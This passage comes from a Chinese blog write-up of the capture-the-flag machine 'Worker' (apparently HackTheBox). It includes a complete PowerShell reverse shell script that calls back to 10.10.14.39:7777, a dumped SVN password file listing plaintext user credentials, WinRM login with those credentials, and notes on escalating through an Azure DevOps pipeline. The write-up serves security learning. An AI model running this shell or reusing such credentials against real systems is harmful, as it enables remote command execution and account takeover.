[Parameter(Position = 0, Mandatory = <span class="variable">$false</span>, ParameterSetName=<span class="string">&quot;bind&quot;</span>)]</span><br><span class="line">        [String]</span><br><span class="line">        <span class="variable">$IPAddress</span>,</span><br><span class="line"></span><br><span class="line">        [Parameter(Position = 1, Mandatory = <span class="variable">$true</span>, ParameterSetName=<span class="string">&quot;reverse&quot;</span>)]</span><br><span class="line">        [Parameter(Position = 1, Mandatory = <span class="variable">$true</span>, ParameterSetName=<span class="string">&quot;bind&quot;</span>)]</span><br><span class="line">        [Int]</span><br><span class="line">        <span class="variable">$Port</span>,</span><br><span class="line"></span><br><span class="line">        [Parameter(ParameterSetName=<span class="string">&quot;reverse&quot;</span>)]</span><br><span class="line">        [Switch]</span><br><span class="line">        <span class="variable">$Reverse</span>,</span><br><span class="line"></span><br><span class="line">        [Parameter(ParameterSetName=<span class="string">&quot;bind&quot;</span>)]</span><br><span class="line">        [Switch]</span><br><span class="line">        <span class="variable">$Bind</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    try </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">#Connect back if the reverse switch is used.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Reverse</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="variable">$IPAddress</span>,<span class="variable">$Port</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Bind to the provided port if Bind switch is used.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Bind</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$listener</span> = [System.Net.Sockets.TcpListener]<span class="variable">$Port</span></span><br><span class="line">            <span class="variable">$listener</span>.start()    </span><br><span class="line">            <span class="variable">$client</span> = <span class="variable">$listener</span>.AcceptTcpClient()</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream()</span><br><span class="line">        [byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Send back current username and computername</span></span><br><span class="line">        <span class="variable">$sendbytes</span> = ([text.encoding]::ASCII).GetBytes(<span class="string">&quot;Windows PowerShell running as user &quot;</span> + <span class="variable">$env</span>:username + <span class="string">&quot; on &quot;</span> + <span class="variable">$env</span>:computername + <span class="string">&quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;</span>)</span><br><span class="line">        <span class="variable">$stream</span>.Write(<span class="variable">$sendbytes</span>,0,<span class="variable">$sendbytes</span>.Length)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Show an interactive PowerShell prompt</span></span><br><span class="line">        <span class="variable">$sendbytes</span> = ([text.encoding]::ASCII).GetBytes(<span class="string">&#x27;PS &#x27;</span> + (Get-Location).Path + <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        <span class="variable">$stream</span>.Write(<span class="variable">$sendbytes</span>,0,<span class="variable">$sendbytes</span>.Length)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$EncodedText</span> = New-Object -TypeName System.Text.ASCIIEncoding</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$EncodedText</span>.GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>)</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">#Execute the command on the target.</span></span><br><span class="line">                <span class="variable">$sendback</span> = (Invoke-Expression -Command <span class="variable">$data</span> 2&gt;&amp;1 | Out-String )</span><br><span class="line">            &#125;</span><br><span class="line">            catch</span><br><span class="line">            &#123;</span><br><span class="line">                Write-Warning <span class="string">&quot;Something went wrong with execution of command on the target.&quot;</span> </span><br><span class="line">                Write-Error <span class="variable">$_</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (Get-Location).Path + <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line">            <span class="variable">$x</span> = (<span class="variable">$error</span>[0] | Out-String)</span><br><span class="line">            <span class="variable">$error</span>.clear()</span><br><span class="line">            <span class="variable">$sendback2</span> = <span class="variable">$sendback2</span> + <span class="variable">$x</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#Return the results</span></span><br><span class="line">            <span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>)</span><br><span class="line">            <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length)</span><br><span class="line">            <span class="variable">$stream</span>.Flush()  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$client</span>.Close()</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$listener</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$listener</span>.Stop()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Write-Warning <span class="string">&quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot;</span> </span><br><span class="line">        Write-Error <span class="variable">$_</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.39 -Port 7777</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>成功获取defaultapppool的shell，查看robisl桌面文件拒绝访问，得找到这个用户密码了<br>查看磁盘情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; get-psdrive -psprovider filesystem</span><br><span class="line"></span><br><span class="line">Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation</span><br><span class="line">----           ---------     --------- --------      ----                                               ---------------</span><br><span class="line">C                  19,67          9,73 FileSystem    C:\                                                               </span><br><span class="line">W                   2,52         17,48 FileSystem    W:\                                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在w盘找到svn仓库的配置文件，发现密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PS W:\&gt; <span class="built_in">type</span> svnrepos\www\conf\passwd                                    </span><br><span class="line"><span class="comment">### This file is an example password file for svnserve.</span></span><br><span class="line"><span class="comment">### Its format is similar to that of svnserve.conf. As shown in the</span></span><br><span class="line"><span class="comment">### example below it contains one section labelled [users].</span></span><br><span class="line"><span class="comment">### The name and password for each user follow, one account per line.</span></span><br><span class="line"></span><br><span class="line">[users]</span><br><span class="line">nathen = wendel98</span><br><span class="line">nichin = fqerfqerf</span><br><span class="line">nichin = asifhiefh</span><br><span class="line">noahip = player</span><br><span class="line">nuahip = wkjdnw</span><br><span class="line">oakhol = bxwdjhcue</span><br><span class="line">owehol = supersecret</span><br><span class="line">paihol = painfulcode</span><br><span class="line">parhol = gitcommit</span><br><span class="line">pathop = iliketomoveit</span><br><span class="line">pauhor = nowayjose</span><br><span class="line">payhos = icanjive</span><br><span class="line">perhou = elvisisalive</span><br><span class="line">peyhou = ineedvacation</span><br><span class="line">phihou = pokemon</span><br><span class="line">quehub = pickme</span><br><span class="line">quihud = kindasecure</span><br><span class="line">rachul = guesswho</span><br><span class="line">raehun = idontknow</span><br><span class="line">ramhun = thisis</span><br><span class="line">ranhut = getting</span><br><span class="line">rebhyd = rediculous</span><br><span class="line">reeinc = iagree</span><br><span class="line">reeing = tosomepoint</span><br><span class="line">reiing = isthisenough</span><br><span class="line">renipr = dummy</span><br><span class="line">rhiire = users</span><br><span class="line">riairv = canyou</span><br><span class="line">ricisa = seewhich</span><br><span class="line">robish = onesare</span><br><span class="line">robisl = wolves11</span><br><span class="line">robive = andwhich</span><br><span class="line">ronkay = onesare</span><br><span class="line">rubkei = the</span><br><span class="line">rupkel = sheeps</span><br><span class="line">ryakel = imtired</span><br><span class="line">sabken = drjones</span><br><span class="line">samken = aqua</span><br><span class="line">sapket = hamburger</span><br><span class="line">sarkil = friday</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>nmap扫描时发现是开放了5985（<a target="_blank" rel="noopener" href="https://paper.seebug.org/1004/">WinRAM</a>）端口的，使用robisl/wolves11，evil-rmi登陆worker，成功<br>可以在桌面找到user flag了</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用robisl/wolves11登陆devops，看看会有什么<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603860965492-c85287f4-966d-4b76-aa7c-d22404d64987.png#align=left&display=inline&height=665&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1330&originWidth=1298&size=80702&status=done&style=none&width=649" alt="image.png"><br>啥东西，玩不明白了<br>azure devops 可以看看这个？<a target="_blank" rel="noopener" href="https://azure.microsoft.com/en-us/services/devops/">https://azure.microsoft.com/en-us/services/devops/</a><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603861204564-1d2f06d5-54bd-4614-a843-b3b31c268c0f.png#align=left&display=inline&height=474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=948&originWidth=1396&size=146075&status=done&style=none&width=698" alt="image.png"><br>这意思是说构建是administrator权限吧？<br>想按上面的思路访问看看<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603861392853-828e0cfd-239a-407d-810d-46cf64b1f6fd.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=703&size=45724&status=done&style=none&width=351.5" alt="image.png"><br>额，不行，那上传不了webshell？<br>答案说在pieline，流水线作业里面，额<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603861598062-17761a35-726d-4510-bd16-178f7b41d001.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=454&originWidth=832&size=41766&status=done&style=none&width=416" alt="image.png"><br>这个流水线跑起来就能获取到falg了，可以执行任何操作。。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/25/hello-world/" rel="prev" title="Hello World">
+      <i class="fa fa-chevron-left"></i> Hello World
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Worker"><span class="nav-number">1.</span> <span class="nav-text">Worker</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AD%94%E6%A1%88%E5%8F%82%E8%80%83%EF%BC%9Ahttps-www-youtube-com-watch-v-15v7V9-7HfI"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">答案参考：https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;15v7V9_7HfI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ououover</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ououover</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
